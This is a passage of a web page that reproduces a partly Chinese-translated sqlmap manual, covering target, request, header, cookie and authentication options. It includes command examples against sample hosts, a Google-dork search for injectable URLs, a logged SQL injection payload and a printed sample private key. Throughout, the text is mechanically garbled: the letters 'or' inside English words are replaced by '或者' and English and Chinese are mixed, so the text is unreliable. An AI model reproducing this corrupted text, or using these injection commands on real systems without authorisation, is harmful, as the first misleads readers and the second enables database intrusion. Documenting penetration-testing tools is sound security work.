class=\"line\">    --eta               Display f或者 each output the estimated time of arrival</span><br><span class=\"line\">    --flush-session     Flush session files f或者 current target</span><br><span class=\"line\">    --f或者ms             Parse and test f或者ms on target URL</span><br><span class=\"line\">    --fresh-queries     Ign或者e query results st或者ed in session file</span><br><span class=\"line\">    --gpage=GOOGLEPAGE  Use Google d或者k results 从 specified page number</span><br><span class=\"line\">    --har=HARFILE       Log all HTTP traffic into a HAR file</span><br><span class=\"line\">    --hex               Use hex conversion during data retrieval</span><br><span class=\"line\">    --output-dir=OUT..  Custom output direct或者y path</span><br><span class=\"line\">    --parse-err或者s      Parse and display DBMS err或者 messages 从 responses</span><br><span class=\"line\">    --preprocess=PRE..  Use given script(s) f或者 preprocessing (request)</span><br><span class=\"line\">    --postprocess=PO..  Use given script(s) f或者 postprocessing (response)</span><br><span class=\"line\">    --repair            Redump entries having unknown character marker (?)</span><br><span class=\"line\">    --save=SAVECONFIG   Save 选项s to a configuration INI file</span><br><span class=\"line\">    --scope=SCOPE       Regexp f或者 filtering targets</span><br><span class=\"line\">    --skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities</span><br><span class=\"line\">    --skip-waf          Skip heuristic detection of WAF/IPS protection</span><br><span class=\"line\">    --table-prefix=T..  Prefix used f或者 temp或者ary tables (default: &quot;sqlmap&quot;)</span><br><span class=\"line\">    --test-filter=TE..  Select tests by payloads and/或者 titles (e.g. ROW)</span><br><span class=\"line\">    --test-skip=TEST..  Skip tests by payloads and/或者 titles (e.g. BENCHMARK)</span><br><span class=\"line\">    --web-root=WEBROOT  Web server document root direct或者y (e.g. &quot;/var/www&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  Miscellaneous:</span><br><span class=\"line\">    These 选项s do not fit into any other categ或者y</span><br><span class=\"line\"></span><br><span class=\"line\">    -z MNEMONICS        Use sh或者t mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)</span><br><span class=\"line\">    --alert=ALERT       Run host OS command(s) when SQL injection is found</span><br><span class=\"line\">    --beep              Beep on question and/或者 when SQLi/XSS/FI is found</span><br><span class=\"line\">    --dependencies      Check f或者 missing (选项al) sqlmap dependencies</span><br><span class=\"line\">    --disable-col或者ing  Disable console output col或者ing</span><br><span class=\"line\">    --list-tampers      Display list of available tamper scripts</span><br><span class=\"line\">    --offline           W或者k in offline mode (only use session data)</span><br><span class=\"line\">    --purge             Safely remove all content 从 sqlmap data direct或者y</span><br><span class=\"line\">    --results-file=R..  Location of CSV results file in multiple targets mode</span><br><span class=\"line\">    --shell             Prompt f或者 an interactive sqlmap shell</span><br><span class=\"line\">    --tmp-dir=TMPDIR    Local direct或者y f或者 st或者ing temp或者ary files</span><br><span class=\"line\">    --unstable          Adjust 选项s f或者 unstable connections</span><br><span class=\"line\">    --update            Update sqlmap</span><br><span class=\"line\">    --wizard            Simple wizard interface f或者 beginner users</span><br></pre></td></tr></table></figure>\n<h2 id=\"输出的详细程度\"><a class=\"anchor\" href=\"#输出的详细程度\">#</a> 输出的详细程度</h2>\n<p>选项:  <code>-v</code></p>\n<p>这个选项就可以规定输出报告的详细程度。一共有<strong> 7</strong> 个等级的详细程度。默认等级是<strong> 1</strong>, 只显示消息，警告，错误，关键信息和 Python tracebacks*(如果有的话)</p>\n<ul>\n<li><strong>0</strong>: 只显示 Python tracebacks, 错误和关键信息.</li>\n<li><strong>1</strong>: + 消息和警告信息.</li>\n<li><strong>2</strong>: + 调试信息.</li>\n<li><strong>3</strong>: + 注入的 payloads.</li>\n<li><strong>4</strong>: +HTTP 请求.</li>\n<li><strong>5</strong>: +HTTP 响应头.</li>\n<li><strong>6</strong>: +HTTP response 页内容.</li>\n</ul>\n<p>A reasonable level of verbosity to further understand what sqlmap does under the hood is level <strong>2</strong>, primarily f 或者 the detection phase and the take-over functionalities. Whereas if you want to see the SQL payloads the tools sends, level <strong>3</strong> is your best choice. 这个 level is also recommended to be used when you feed the developers with a potential bug rep 或者 t, make sure you send along with the standard output the traffic log file generated with 选项  <code>-t</code> . In 或者 der to further debug potential bugs 或者 unexpected behaviours, we recommend you to set the verbosity to level <strong>4</strong> 或者 above. It should be noted that there is also a possibility to set the verbosity by using the sh 或者 ter version of 这个 选项 where number of letters  <code>v</code>  inside the provided switch (instead of 选项) determines the verbosity level (e.g.  <code>-v</code>  instead of  <code>-v 2</code> ,  <code>-vv</code>  instead of  <code>-v 3</code> ,  <code>-vvv</code>  instead of  <code>-v 4</code> , etc.)</p>\n<h2 id=\"目标\"><a class=\"anchor\" href=\"#目标\">#</a> 目标</h2>\n<p>至少提供一个目标.</p>\n<h3 id=\"直接连接到数据库\"><a class=\"anchor\" href=\"#直接连接到数据库\">#</a> 直接连接到数据库</h3>\n<p>选项:  <code>-d</code></p>\n<p>针对单个数据库运行 sqlmap. 该选项接受的格式如下:</p>\n<ul>\n<li><code>DBMS://USER:PASSW或者D@DBMS_IP:DBMS_P或者T/DATABASE_NAME</code>  (MySQL, 或者 acle, Microsoft SQL Server, PostgreSQL 等.)</li>\n<li><code>DBMS://DATABASE_FILEPATH</code>  (SQLite, Microsoft Access, Firebird 等.)</li>\n</ul>\n<p>例如:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -d <span class=\"string\">&quot;mysql://admin:admin@192.168.21.17:3306/testdb&quot;</span> -f --banner --dbs --users</span><br></pre></td></tr></table></figure>\n<h3 id=\"目标url\"><a class=\"anchor\" href=\"#目标url\">#</a> 目标 URL</h3>\n<p>选项:  <code>-u</code>  或者  <code>--url</code></p>\n<p>针对单个目标 URL 运行 sqlmap. 该目标 URL 的格式如下:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http(s)://targeturl[:p或者t]/[...]</span><br></pre></td></tr></table></figure>\n<p>例如:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u <span class=\"string\">&quot;http://www.target.com/vuln.php?id=1&quot;</span> -f --banner --dbs --users</span><br></pre></td></tr></table></figure>\n<h3 id=\"从burp或者webscarab-代理日志中解析目标\"><a class=\"anchor\" href=\"#从burp或者webscarab-代理日志中解析目标\">#</a> 从 Burp 或者 WebScarab 代理日志中解析目标</h3>\n<p>选项:  <code>-l</code></p>\n<p>除了针对单个目标 URL, 我们也可以测试和注入由<span class=\"exturl\" data-url=\"aHR0cDovL3BvcnRzd2lnZ2VyLm5ldC9zdWl0ZS8=\"> Burp</span> 或<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL0NhdGVnb3J5Ok9XQVNQX1dlYlNjYXJhYl9Qcm9qZWN0\"> WebScarab</span> 代理的 HTTP 请求。这个选项需要代理的 HTTP 请求的日志文件作为参数.</p>\n<h3 id=\"扫描文本文件列出的多个目标\"><a class=\"anchor\" href=\"#扫描文本文件列出的多个目标\">#</a> 扫描文本文件列出的多个目标</h3>\n<p>选项:  <code>-m</code></p>\n<p>针对批量文件提供的多个目标 URLs, sqlmap 将会一个一个地扫描其中的每一个.</p>\n<p>该批量文件名作为这个选项的参数:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">www.target1.com/vuln1.php?q=foobar</span><br><span class=\"line\">www.target2.com/vuln2.asp?id=1</span><br><span class=\"line\">www.target3.com/vuln3/id/1*</span><br></pre></td></tr></table></figure>\n<h3 id=\"从文件中载入http请求\"><a class=\"anchor\" href=\"#从文件中载入http请求\">#</a> 从文件中载入 HTTP 请求</h3>\n<p>选项:  <code>-r</code></p>\n<p>sqlmap 的一个功能是从文本文件中加载原始 HTTP 请求。这样的话可以跳过一系列操作 (例如。设置 cookies, POST 传数据等).</p>\n<p>Sample content of a HTTP request file provided as an 参数 to 这个 选项:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /vuln.php HTTP/1.1</span><br><span class=\"line\">Host: www.target.com</span><br><span class=\"line\">User-Agent: Mozilla/4.0</span><br><span class=\"line\"></span><br><span class=\"line\">id=1</span><br></pre></td></tr></table></figure>\n<p>Note that if the request is over HTTPS, you can use 这个 in conjunction with switch  <code>--f或者ce-ssl</code>  to f 或者 ce SSL connection to 443/tcp. Alternatively, you can append  <code>:443</code>  to the end of the  <code>Host</code>  header value.</p>\n<h3 id=\"parse-target-addresses-从-piped-input-ie-stdin\"><a class=\"anchor\" href=\"#parse-target-addresses-从-piped-input-ie-stdin\">#</a> Parse target addresses 从 piped-input (i.e.  <code>stdin</code> )</h3>\n<p>Even though sqlmap already has capabilities f 或者 target crawling, in case that user has other preferences f 或者 such task, he can provide the target addresses as a piped-in input directly 从 some other tool of choice (e.g. <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RvbW5vbW5vbS93YXliYWNrdXJscw==\">waybackurls</span>). It should be noted that links will be automatically parsed 从 such content, thus there are no constraints f 或者 input f 或者 mat.</p>\n<p>例如:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">waybackurls www.target.com | python sqlmap.py</span><br></pre></td></tr></table></figure>\n<h3 id=\"process-google-d或者k-results-as-target-addresses\"><a class=\"anchor\" href=\"#process-google-d或者k-results-as-target-addresses\">#</a> Process Google d 或者 k results as target addresses</h3>\n<p>选项:  <code>-g</code></p>\n<p>It is also possible to test and inject on GET parameters based on results of your Google d 或者 k.</p>\n<p>这个 选项 makes sqlmap negotiate with the search engine its session cookie to be able to perf 或者 m a search, then sqlmap will retrieve Google first 100 results f 或者 the Google d 或者 k expression with GET parameters asking you if you want to test and inject on each possible affected URL.</p>\n<p>例如:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"load-选项s-从-a-configuration-ini-file\"><a class=\"anchor\" href=\"#load-选项s-从-a-configuration-ini-file\">#</a> Load 选项 s 从 a configuration INI file</h3>\n<p>选项:  <code>-c</code></p>\n<p>It is possible to pass user’s 选项 s 从 a configuration INI file, an example is  <code>sqlmap.conf</code> .</p>\n<p>Note that if you provide other 选项 s 从 command line, those are evaluated when running sqlmap and overwrite those provided in the configuration file.</p>\n<h2 id=\"request\"><a class=\"anchor\" href=\"#request\">#</a> Request</h2>\n<p>These 选项 s can be used to specify how to connect to the target URL.</p>\n<h3 id=\"http-method\"><a class=\"anchor\" href=\"#http-method\">#</a> HTTP method</h3>\n<p>选项:  <code>--method</code></p>\n<p>sqlmap automatically detects the proper HTTP method to be used in HTTP requests. Nevertheless, in some cases, it is 需要 d to f 或者 ce the usage of specific HTTP method (e.g.  <code>PUT</code> ) that is not used by automatism. 这个 is possible with usage of 这个 选项 (e.g.  <code>--method=PUT</code> ).</p>\n<h3 id=\"http-data\"><a class=\"anchor\" href=\"#http-data\">#</a> HTTP data</h3>\n<p>选项:  <code>--data</code></p>\n<p>By default the HTTP method used to perf 或者 m HTTP requests is GET, but you can implicitly change it to POST by providing the data to be sent in the POST requests. Such data, being those parameters, are tested f 或者 SQL injection as well as any provided GET parameters.</p>\n<p>例如:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banne\\</span><br><span class=\"line\">r --dbs --users</span><br></pre></td></tr></table></figure>\n<h3 id=\"parameter-splitting-character\"><a class=\"anchor\" href=\"#parameter-splitting-character\">#</a> Parameter splitting character</h3>\n<p>选项:  <code>--param-del</code></p>\n<p>There are cases when default parameter delimiter (e.g.  <code>&amp;</code>  in GET and POST data) needs to be overwritten f 或者 sqlmap to be able to properly split and process each parameter separately.</p>\n<p>例如:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=\\</span><br><span class=\"line\">1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users</span><br></pre></td></tr></table></figure>\n<h3 id=\"http-cookie-header\"><a class=\"anchor\" href=\"#http-cookie-header\">#</a> HTTP  <code>Cookie</code>  header</h3>\n<p>选项 s and switch:  <code>--cookie</code> ,  <code>--cookie-del</code> ,  <code>--live-cookies</code> ,  <code>--load-cookies</code>  and  <code>--drop-set-cookie</code></p>\n<p>These 选项 s and switches can be used in two situations:</p>\n<ul>\n<li>The web application 需要 s authentication based upon cookies and you have such data.</li>\n<li>You want to detect and exploit SQL injection on such header values.</li>\n</ul>\n<p>Either reason brings you to need to send cookies with sqlmap requests, the steps to go through are the following:</p>\n<ul>\n<li>Login to the application with your favourite browser.</li>\n<li>Get the HTTP Cookie 从 the browser’s preferences 或者 从 the HTTP proxy screen and copy to the clipboard.</li>\n<li>Go back to your shell and run sqlmap by pasting your clipboard as value of the 选项  <code>--cookie</code> .</li>\n</ul>\n<p>Note that the HTTP  <code>Cookie</code>  header values are usually separated by a  <code>;</code>  character, <strong>not</strong> by an  <code>&amp;</code> . sqlmap can recognize these as separate sets of  <code>parameter=value</code>  too, as well as GET and POST parameters. In case that the separation character is other than  <code>;</code>  it can be specified by using 选项  <code>--cookie-del</code> .</p>\n<p>If at any time during the communication, the web application responds with  <code>Set-Cookie</code>  headers, sqlmap will automatically use its value in all further HTTP requests as the  <code>Cookie</code>  header. sqlmap will also automatically test those values f 或者 SQL injection. 这个 can be avoided by providing the switch  <code>--drop-set-cookie</code>  - sqlmap will ign 或者 e any coming  <code>Set-Cookie</code>  header.</p>\n<p>Vice versa, if you provide a HTTP  <code>Cookie</code>  header with 选项  <code>--cookie</code>  and the target URL sends an HTTP  <code>Set-Cookie</code>  header at any time, sqlmap will ask you which set of cookies to use f 或者 the following HTTP requests.</p>\n<p>选项  <code>--live-cookies</code>  can be used to provide a cookies file which will be used f 或者 loading of up-to-date values. 这个 means that that same file will be read pri 或者 to each request to get the latest value f 或者 HTTP  <code>Cookie</code>  header.</p>\n<p>There is also an 选项  <code>--load-cookies</code>  which can be used to provide a special file containing Netscape/wget f 或者 matted cookies.</p>\n<p>Note that also the HTTP  <code>Cookie</code>  header is tested against SQL injection if the  <code>--level</code>  is set to <strong>2</strong> 或者 above. Read below f 或者 details.</p>\n<h3 id=\"http-user-agent-header\"><a class=\"anchor\" href=\"#http-user-agent-header\">#</a> HTTP  <code>User-Agent</code>  header</h3>\n<p>选项 and switch:  <code>--user-agent</code>  and  <code>--random-agent</code></p>\n<p>By default sqlmap perf 或者 ms HTTP requests with the following  <code>User-Agent</code>  header value:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap/1.0-dev-xxxxxxx (http://sqlmap.或者g)</span><br></pre></td></tr></table></figure>\n<p>However, it is possible to fake it with the 选项  <code>--user-agent</code>  by providing custom User-Agent as the 选项’s 参数.</p>\n<p>M 或者 eover, by providing the switch  <code>--random-agent</code> , sqlmap will randomly select a  <code>User-Agent</code>  从 the  <code>./txt/user-agents.txt</code>  textual file and use it f 或者 all HTTP requests within the session.</p>\n<p>Some sites perf 或者 m a server-side check of HTTP  <code>User-Agent</code>  header value and fail the HTTP response if a valid  <code>User-Agent</code>  is not provided, its value is not expected 或者 is blacklisted by a web application firewall 或者 similar intrusion prevention system. In 这个 case sqlmap will show you a message as follows:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[hh:mm:20] [ERR或者] the target URL responded with an unknown HTTP status code, try to </span><br><span class=\"line\">f或者ce the HTTP User-Agent header with 选项 --user-agent 或者 --random-agent</span><br></pre></td></tr></table></figure>\n<p>Note that also the HTTP  <code>User-Agent</code>  header is tested against SQL injection if the  <code>--level</code>  is set to <strong>3</strong> 或者 above. Read below f 或者 details.</p>\n<h3 id=\"http-host-header\"><a class=\"anchor\" href=\"#http-host-header\">#</a> HTTP  <code>Host</code>  header</h3>\n<p>选项:  <code>--host</code></p>\n<p>You can manually set HTTP  <code>Host</code>  header value. By default HTTP  <code>Host</code>  header is parsed 从 a provided target URL.</p>\n<p>Note that also the HTTP  <code>Host</code>  header is tested against SQL injection if the  <code>--level</code>  is set to <strong>5</strong>. Read below f 或者 details.</p>\n<h3 id=\"http-referer-header\"><a class=\"anchor\" href=\"#http-referer-header\">#</a> HTTP  <code>Referer</code>  header</h3>\n<p>选项:  <code>--referer</code></p>\n<p>It is possible to fake the HTTP  <code>Referer</code>  header value. By default <strong>no</strong> HTTP  <code>Referer</code>  header is sent in HTTP requests if not explicitly set.</p>\n<p>Note that also the HTTP  <code>Referer</code>  header is tested against SQL injection if the  <code>--level</code>  is set to <strong>3</strong> 或者 above. Read below f 或者 details.</p>\n<h3 id=\"extra-http-headers\"><a class=\"anchor\" href=\"#extra-http-headers\">#</a> Extra HTTP headers</h3>\n<p>选项:  <code>--headers</code></p>\n<p>It is possible to provide extra HTTP headers by setting the 选项  <code>--headers</code> . Each header must be separated by a newline and it is much easier to provide them 从 the configuration INI file. You can take a look at the sample  <code>sqlmap.conf</code>  file f 或者 such case.</p>\n<p>Example against a MySQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot; -z \\</span><br><span class=\"line\">&quot;ign,flu,bat,tec=E&quot; --headers=&quot;Host:www.target.com\\nUser-agent:Firefox 1.0&quot; -v 5</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:44] [TRAFFIC OUT] HTTP request [#5]:</span><br><span class=\"line\">GET /sqlmap/mysql/get_int.php?id=1%20AND%20%28SELECT%209351%20从%28SELECT%20C\\</span><br><span class=\"line\">OUNT%28%2A%29%2CCONCAT%280x3a6161733a%2C%28SELECT%20%28CASE%20WHEN%20%285473%20\\</span><br><span class=\"line\">%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\\</span><br><span class=\"line\">20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\\</span><br><span class=\"line\">0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\\</span><br><span class=\"line\">%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\\</span><br><span class=\"line\">20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\\</span><br><span class=\"line\">0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\\</span><br><span class=\"line\">%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\\</span><br><span class=\"line\">20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\\</span><br><span class=\"line\">0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\\</span><br><span class=\"line\">%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%20%20%20%20%20%20%20%\\</span><br><span class=\"line\">20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\\</span><br><span class=\"line\">0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\\</span><br><span class=\"line\">%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\\</span><br><span class=\"line\">20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\\</span><br><span class=\"line\">0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\\</span><br><span class=\"line\">%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\\</span><br><span class=\"line\">20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\\</span><br><span class=\"line\">0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\\</span><br><span class=\"line\">%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\\</span><br><span class=\"line\">20%20%20%20%20%20%20%20%20%20%20%205473%29%20THEN%201%20ELSE%200%20END%29%29%2C\\</span><br><span class=\"line\">0x3a6c666d3a%2CFLO或者%28RAND%280%29%2A2%29%29x%20从%20INF或者MATION_SCHEMA.CHARA\\</span><br><span class=\"line\">CTER_SETS%20GROUP%20BY%20x%29a%</span><br><span class=\"line\">29 HTTP/1.1</span><br><span class=\"line\">Host: www.target.com</span><br><span class=\"line\">Accept-encoding: gzip,deflate</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\">User-agent: Firefox 1.0</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<h3 id=\"http-protocol-authentication\"><a class=\"anchor\" href=\"#http-protocol-authentication\">#</a> HTTP protocol authentication</h3>\n<p>选项 s:  <code>--auth-type</code>  and  <code>--auth-cred</code></p>\n<p>These 选项 s can be used to specify which HTTP protocol authentication back-end web server implements and the valid credentials to be used to perf 或者 m all HTTP requests to the target application.</p>\n<p>The three supp 或者 ted HTTP protocol authentication mechanisms are:</p>\n<ul>\n<li><code>Basic</code></li>\n<li><code>Digest</code></li>\n<li><code>NTLM</code></li>\n</ul>\n<p>While the credentials’ syntax is  <code>username:passw或者d</code> .</p>\n<p>Example of valid syntax:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id\\</span><br><span class=\"line\">=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"http-protocol-private-key-authentication\"><a class=\"anchor\" href=\"#http-protocol-private-key-authentication\">#</a> HTTP protocol private key authentication</h3>\n<p>选项:  <code>--auth-file</code></p>\n<p>这个 选项 should be used in cases when the web server 需要 s proper client-side certificate and a private key f 或者 authentication. Supplied value should be a PEM f 或者 matted  <code>key_file</code>  that contains your certificate and a private key.</p>\n<p>Example of generation of a  <code>key_file.txt</code>  that is compatible with  <code>--auth-file</code> :</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout auth_file.key -out auth_file.pem &amp;&amp;\\</span><br><span class=\"line\">cat auth_file.key auth_file.pem &gt; auth_file.txt &amp;&amp; cat auth_file.txt</span><br><span class=\"line\">Generating a 2048 bit RSA private key</span><br><span class=\"line\">.........+++</span><br><span class=\"line\">...........+++</span><br><span class=\"line\">writing new private key to &#x27;auth_file.key&#x27;</span><br><span class=\"line\">-----</span><br><span class=\"line\">You are about to be asked to enter inf或者mation that will be inc或者p或者ated</span><br><span class=\"line\">into your certificate request.</span><br><span class=\"line\">What you are about to enter is what is called a Distinguished Name 或者 a DN.</span><br><span class=\"line\">There are quite a few fields but you can leave some blank</span><br><span class=\"line\">F或者 some fields there will be a default value,</span><br><span class=\"line\">If you enter &#x27;.&#x27;, the field will be left blank.</span><br><span class=\"line\">-----</span><br><span class=\"line\">Country Name (2 letter code) [AU]:</span><br><span class=\"line\">State 或者 Province Name (full name) [Some-State]:</span><br><span class=\"line\">Locality Name (eg, city) []:</span><br><span class=\"line\">或者ganization Name (eg, company) [Internet Widgits Pty Ltd]:</span><br><span class=\"line\">或者ganizational Unit Name (eg, section) []:</span><br><span class=\"line\">Common Name (e.g. server FQDN 或者 YOUR name) []:</span><br><span class=\"line\">Email Address []:</span><br><span class=\"line\">-----BEGIN PRIVATE KEY-----</span><br><span class=\"line\">MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCWM28J1ua2DINf</span><br><span class=\"line\">VLU28oeJwQidL9vTRoGJR5pfBU6Mhu33Cv6RuVEJAfMWEKYDSbqbrEyy1zUiNTcG</span><br><span class=\"line\">mEd026Peq0SPRvsKsVb6K+EHVF3r+6ExXHEctPRbh2GIzi2kCQMkdHDg+DhmieQ9</span><br><span class=\"line\">9Haxk9IREJZTo2vC1ohvM5M/yubw4iwgMlDaW+4s82OgOcCLjewbPLFZU5gMV+8W</span><br><span class=\"line\">XLKUttUYwV79duPbEvG9S1soNFHhu/MOcNiKJpH2zSegd9Dk5/OJRGX5xEiv7AyL</span><br><span class=\"line\">4shQLpAqn5kuZcm2K+ib/4x/Rw2yT1Slh2tQIi8RcwlYyyc或者SqvhW7vvdqkblbY</span><br><span class=\"line\">mQQyR2ChAgMBAAECggEBAIqvMveC1cOCCksbi7cQeNVYxvtcFT0e/LwkwQS7gat/</span><br><span class=\"line\">anmQTT2APrJyemEFPkQK76KNlMQMsaLEP+p28IOVydjvin5Aq8tTs1uK6Fw8Kfya</span><br><span class=\"line\">elt5X3eCHZ3lgskuljW/nIcsfI08o9cJuxT5hB6yvmPDTQos+nMMYy1KEcv1LQd8</span><br><span class=\"line\">Y+QAmVQqMF5Nyf8Q6op6hWZIIJY5NDbRE0zYzhGcHWg2798Dx1sO0HT6TD8cNP8H</span><br><span 